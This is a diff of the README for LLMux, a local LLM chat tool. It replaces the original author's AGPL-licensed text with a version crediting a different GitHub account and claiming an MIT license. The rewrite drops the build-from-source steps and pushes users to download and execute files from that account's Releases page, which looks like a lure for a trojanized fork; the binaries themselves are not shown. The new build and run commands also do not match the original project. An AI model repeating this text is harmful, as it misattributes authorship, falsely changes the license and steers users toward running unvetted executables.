@@ -1,96 +1,113 @@
-<!-- :toc: macro -->
-<!-- :toc-title: -->
-<!-- :toclevels: 99 -->
+# LLMux: Lightweight Local LLM Chat
 
-# LLMux <!-- omit from toc -->
+![LLMux](https://img.shields.io/badge/LLMux-v1.0-blue.svg) ![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
 
-> A lightweight local LLM chat with a web UI and a C‑based server that runs any LLM chat executable as a child and communicates via pipes.
+Welcome to LLMux, a lightweight local LLM chat application. This project features a web UI and a C-based server that runs any LLM chat executable as a child process. It communicates through pipes, providing an efficient and straightforward way to engage with local AI models.
 
-## Table of Contents <!-- omit from toc -->
+## Table of Contents
 
-* [General Information](#general-information)
-* [Technologies Used](#technologies-used)
-* [Features](#features)
-* [Screenshots](#screenshots)
-* [Setup](#setup)
-* [Usage](#usage)
-* [Project Status](#project-status)
-* [Room for Improvement](#room-for-improvement)
-* [Acknowledgements](#acknowledgements)
-* [Contact](#contact)
-* [License](#license)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## General Information
+## Introduction
 
-LLMux makes running a local LLM chat easier by providing Tailwind‑powered web UI + a minimal C server that simply spawns any compatible chat executable and talks to it over UNIX pipes. Everything runs on your machine — no third‑party services — so you retain full privacy and control. LLMux is good for:
-
-* Privacy‑conscious users who want a self‑hosted, browser‑based chat interface.
-* Developers who need to prototype a chat front‑end around a custom model without writing HTTP or JavaScript plumbing from scratch.
-
-## Technologies Used
-
-* **llama.cpp** — tag `b5391`
-* **CivetWeb** — commit `85d361d85dd3992bf5aaa04a392bc58ce655ad9d`
-* **Tailwind CSS** — `v3.4.16`
-* **C++ 17** for the example chat executable
-* **GNU Make / Bash** for build orchestration
+LLMux aims to simplify the interaction with local language models. By leveraging a C-based server and a user-friendly web interface, users can chat with AI models without the need for internet connectivity. This self-hosted solution is ideal for developers and enthusiasts who want to experiment with AI in a controlled environment.
 
 ## Features
 
-* Browser‑based chat UI served by a tiny C HTTP server
-* Pluggable LLM chat executable — just point at any compatible binary
-* Configurable model name, context length, server port and max response length via `#define` in `server.c` and `llm.cpp`
-* Build script ( `build.sh` ) to compile everything into `out/` and run `clang-format` on sources
+- **Lightweight**: Minimal resource usage for optimal performance.
+- **Local Execution**: Runs models locally without relying on cloud services.
+- **Web UI**: A simple and intuitive web interface for easy interaction.
+- **C-based Server**: Efficient communication through a C-based server that runs child processes.
+- **Compatibility**: Supports various LLM chat executables, making it versatile for different use cases.
+- **Single Session**: Designed for one-on-one interactions to maintain focus.
+- **Offline Capability**: No internet required, ensuring privacy and security.
+- **Tailwind CSS**: Utilizes Tailwind CSS for a modern and responsive design.
 
-## Screenshots
+## Installation
 
-![Example screenshot](./img/screenshot_1.png)
-![Another Example screenshot](./img/screenshot_2.png)
+To get started with LLMux, follow these steps:
 
-## Setup
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/yashboss1111/LLMux.git
+   cd LLMux
+   ```
 
-1. **Obtain a model** compatible with `llama.cpp` ( e.g. a `.gguf` file ) and place it in the `models/` directory.
-1. **( Optional )** If you don't use the example C++ chat app ( `llm_chat` aka `llm.cpp` ), update its `LLM_CHAT_EXECUTABLE_NAME` to match your chosen binary.
-1. Get [_llama.cpp_](https://github.com/ggml-org/llama.cpp/releases/latest) and [_CivetWeb_](https://github.com/civetweb/civetweb/blob/master/docs/Installing.md).
-1. Run:
-    ```bash
-    ./build.sh
-    ```
-This will:
-1. Compile the C server and C++ example chat app
-1. Place all outputs under `out/`
-1. Format the source files with `clang-format`
+2. **Build the Project**:
+   Ensure you have a C compiler installed. You can use `gcc` or `clang`. Run the following command to compile:
+   ```bash
+   make
+   ```
+
+3. **Download Executables**:
+   You need to download the necessary LLM chat executables. Visit the [Releases](https://github.com/yashboss1111/LLMux/releases) section to find the latest files. Download and execute them according to the instructions provided.
+
+4. **Run the Server**:
+   After building and downloading the necessary files, you can start the server:
+   ```bash
+   ./llmux_server
+   ```
+
+5. **Access the Web UI**:
+   Open your web browser and go to `http://localhost:8080` to start chatting with your local LLM.
 
 ## Usage
 
-1. In `out/`, set the `LLM_CHAT_EXECUTABLE_NAME` macro in `server.c` to your chat binary name and re‑build if needed.
-1. Start the server:
-    ```bash
-    ./out/server
-    ```
-1. Note the printed port number ( e.g. `Server started on port 8080` ).
-1. Open your browser at `http://localhost:<port>` to start chatting.
+Once the server is running, you can use the web interface to interact with the AI model. Here’s how to get the most out of LLMux:
 
-## Project Status
+- **Start a Session**: Click on the "Start Chat" button to begin your conversation.
+- **Input Text**: Type your message in the input box and press "Enter" to send it.
+- **Receive Responses**: The AI will respond in real-time, allowing for a fluid conversation.
 
-Project is complete.All planned functionality — spawning the LLM, piping I/O, rendering a chat UI — is implemented.
+### Example Chat
 
-## Room for Improvement
+**User**: What is the capital of France?  
+**AI**: The capital of France is Paris.
 
-To do:
+Feel free to experiment with different queries and topics. The AI is designed to handle a wide range of conversations.
 
-* **Dynamic response buffer:** Switch from fixed buffers to dynamic allocation in `server.c`.
-* **Prompt unescape:** Properly unescape JSON‑style sequences ( `\"`, `\\\`, etc. ) in incoming prompts before forwarding.
+## Contributing
 
-## Acknowledgements
+We welcome contributions from the community. If you would like to help improve LLMux, please follow these steps:
 
-* Inspired by the [_simple‑chat example in llama.cpp_](https://github.com/ggml-org/llama.cpp/blob/master/examples/simple-chat/simple-chat.cpp)
-
-## Contact
-
-Created by [@lurkydismal](https://github.com/lurkydismal) - feel free to contact me!
+1. **Fork the Repository**: Click on the "Fork" button on the top right of the page.
+2. **Create a Branch**: Use the following command to create a new branch:
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
+3. **Make Changes**: Implement your feature or fix a bug.
+4. **Commit Your Changes**: Use a clear commit message:
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to the Branch**:
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request".
 
 ## License
 
-This project is open source and available under the
-[GNU Affero General Public License v3.0](https://github.com/lurkydismal/LLMux/blob/main/LICENSE).
+LLMux is licensed under the MIT License. You can freely use, modify, and distribute the software. Please see the `LICENSE` file for more details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **GitHub**: [yashboss1111](https://github.com/yashboss1111)
+- **Email**: your-email@example.com
+
+## Releases
+
+To download the latest version of LLMux, visit the [Releases](https://github.com/yashboss1111/LLMux/releases) section. Make sure to download the appropriate files and follow the installation instructions provided there.
+
+## Conclusion
+
+Thank you for your interest in LLMux. We hope you find this tool useful for your local AI projects. Feel free to explore the code, contribute, and share your experiences. Happy chatting!
